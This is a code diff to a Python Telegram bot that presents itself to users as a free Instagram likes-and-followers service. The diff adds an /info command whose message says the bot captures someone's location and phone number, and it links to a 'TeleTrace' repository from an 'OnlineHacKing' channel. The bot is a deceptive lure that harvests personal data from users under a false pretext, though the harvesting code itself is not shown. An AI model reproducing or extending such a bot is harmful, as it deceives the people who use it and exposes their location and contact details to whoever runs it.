@@ -47,11 +47,20 @@ def handle_check_button_click(call):
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Hello Mr, {message.from_user.first_name}!
-This is a bot for getting likes and subscribers on Instagram!
+This is a bot for getting likes and followers on Instagram!
 To start, write /getfollowers''') 
 @bot.message_handler(commands=['admin'])
 def start(message):
 	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
+
+@bot.message_handler(commands=['info'])
+def start(message):
+    bot.send_message(message.chat.id, '''Hello! I am a developer of this Telegram bot, but I am not an admin of this bot. I have created this bot and uploaded the code to GitHub for open source use.
+
+With the help of this Telegram bot, one can capture someone's location and phone number. If you want to create your own bot, you can find more details by clicking on this link: https://github.com/OnlineHacKing/TeleTrace/
+
+Author of the script: @suman333mondal''')
+
 @bot.message_handler(commands=['getfollowers'])
 def start(message):
 	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
